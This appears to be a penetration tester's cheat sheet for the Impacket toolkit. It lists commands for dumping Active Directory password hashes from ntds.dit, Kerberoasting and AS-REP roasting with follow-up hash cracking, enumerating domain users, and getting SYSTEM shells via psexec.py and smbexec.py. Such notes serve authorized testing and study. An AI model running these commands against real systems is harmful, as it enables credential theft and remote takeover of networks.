# Impacket

> Impacket is a collection of Python classes for working with network protocols.  
* [GitHub - SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)  
* [Fun with network protocols, using Python and Impacket | Andrea Fortuna](https://www.andreafortuna.org/2018/06/18/fun-with-network-protocols-using-python-and-impacket/)

## Related

* [Active Directoy](bear://x-callback-url/open-note?id=5C9EC040-0001-45F1-852C-769DB3092467-524-00001FFA6E2A0DB1)
* [TCP 88: Kerberos](bear://x-callback-url/open-note?id=737CB967-22F6-401E-9BEC-5D28FA7350F1-483-00001AB8DF3B4F91)
* [TCP 389: LDAP](bear://x-callback-url/open-note?id=21D3D852-FB60-4125-BA88-A3E7637264CD-622-00000420E636375E)

## Dump hashes

```powershell
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## Users

> This script will gather data about the domain’s users and their corresponding email addresses.  
```powershell
GetADUsers.py -all -dc-ip <ip> <domain>/<user>:<pw>
```

> This example will try to find and fetch Service Principal Names that are associated with normal user accounts.  
```powershell
GetUserSPNs.py -request <domain>/<user>:<pw> // -dc-ip <ip> 
```
-> Crack hash e.g. using hashcat, to obtain passwords

> An application that communicates with the Security Account Manager Remote interface from the MSRPC suite.  
```powershell
samrdump.py <domain>
```

> This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR.  
```powershell
GetNPUsers.py <domain>/<user> -no-pass
```
-> Crack hash e.g. using hashcat

## Shell (psexec.py)

> PSEXEC like functionality example using RemComSvc.  
-> Get a shell as "nt authority\system"
```powershell
sudo psexec.py [<domain>/]<user>:[<pw>]@<ip>
```

## SMB (smbexec.py)

```powershell
sudo smbexec.py <user>:<pw>@<target>
```
